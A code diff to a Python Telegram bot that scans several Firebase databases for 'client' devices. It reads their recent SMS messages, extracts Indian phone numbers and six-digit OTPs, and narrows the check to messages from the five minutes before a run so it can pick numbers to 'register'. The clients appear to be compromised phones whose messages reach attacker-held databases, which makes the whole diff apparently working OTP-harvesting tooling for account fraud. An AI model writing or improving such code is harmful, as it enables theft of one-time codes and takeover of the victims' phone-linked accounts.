@@ -190,10 +190,10 @@ def extract_phone(messages_dict):
     match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return match.group(1) if match else None
 
-def has_active_otp_pattern(messages_dict):
+def has_5min_window_otp_pattern(messages_dict, bot_start_epoch):
     """
-    Analyzes unpinned recent 5 messages for active OTP patterns.
-    Skips top 2 pinned/sticky messages and checks if recent messages contain 6-digit OTPs.
+    Checks the exact 5-minute window leading up to bot start (e.g., 10:05 to 10:10 if started at 10:10).
+    Evaluates up to the 5 most recent unpinned messages (skipping top 2 pinned items) within that window.
     """
     if not isinstance(messages_dict, dict):
         return False
@@ -201,15 +201,27 @@ def has_active_otp_pattern(messages_dict):
     msg_items = list(messages_dict.items())
     # Skip top 2 pinned/sticky messages, evaluate the recent unpinned messages
     unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
+    recent_five = unpinned_items[-5:] if len(unpinned_items) >= 5 else unpinned_items
+    
+    window_start_epoch = bot_start_epoch - 300  # Exact 5-minute window (300 seconds prior to bot start)
     
     valid_otp_count = 0
-    for _, msg_val in unpinned_items:
+    for _, msg_val in recent_five:
         if isinstance(msg_val, dict):
-            txt = str(msg_val.get("body") or msg_val.get("message") or "")
-            otps = re.findall(r'\b(\d{6})\b', txt)
-            valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
-            if valid_otps:
-                valid_otp_count += 1
+            # Check message timestamp or fallback to evaluation if timestamp format varies
+            msg_time = msg_val.get("timestamp") or msg_val.get("time") or bot_start_epoch
+            try:
+                msg_epoch = float(msg_time) / 1000.0 if float(msg_time) > 1e12 else float(msg_time)
+            except Exception:
+                msg_epoch = bot_start_epoch
+
+            # Must fall within the 5-minute window up to present start time
+            if window_start_epoch <= msg_epoch <= bot_start_epoch:
+                txt = str(msg_val.get("body") or msg_val.get("message") or "")
+                otps = re.findall(r'\b(\d{6})\b', txt)
+                valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+                if valid_otps:
+                    valid_otp_count += 1
                 
     return valid_otp_count > 0
 
@@ -588,7 +600,8 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting unregistered active devices for strict OTP patterns...", parse_mode="HTML", reply_markup=get_main_menu())
+    bot_start_epoch = time.time()  # Exact bot start timestamp (e.g. 10:10)
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting active devices against the 5-minute window leading up to present...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -596,7 +609,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         total_needed = 3
         success_count = 0
         registered_numbers = []
-        skipped_phones = set()  # Permanently blacklists numbers that timeout, fail, or lack OTP patterns
+        skipped_phones = set()  # Permanently blacklists numbers without valid patterns or failing verification
         used_phones = set()
         logger = LiveLogger(status_msg)
 
@@ -604,14 +617,13 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- FULL BULK SCAN ACROSS ALL DATABASES SIMULTANEOUSLY ---
+                # --- BULK SCAN OF UNREGISTERED NUMBERS VETTED AGAINST 5-MINUTE WINDOW ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
                     for fb_url in firebase_dbs:
                         db_short_id = fb_url.split('//')[1].split('.')[0][:8]
                         try:
-                            # Fetch clients list in bulk
                             async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                                 clients_data = await r.json() or {}
 
@@ -619,7 +631,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            # Fetch message history in bulk to inspect recent 7 messages (ignoring top 2 pinned)
                                             async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
@@ -627,8 +638,8 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # STRICT PATTERN CHECK: Must have active OTP patterns in recent unpinned messages
-                                                        if has_active_otp_pattern(msgs):
+                                                        # STRICT 5-MINUTE WINDOWED RECENT PATTERN CHECK
+                                                        if has_5min_window_otp_pattern(msgs, bot_start_epoch):
                                                             all_unregistered_candidates.append({
                                                                 "firebase_url": fb_url,
                                                                 "db_short_id": db_short_id,
@@ -636,7 +647,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                                 "phone": full_phone
                                                             })
                                                         else:
-                                                            # Ignore numbers lacking active OTP pattern immediately
                                                             skipped_phones.add(full_phone)
                                         except Exception:
                                             pass
@@ -644,7 +654,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with valid OTP pattern found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices within the 5-minute window found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
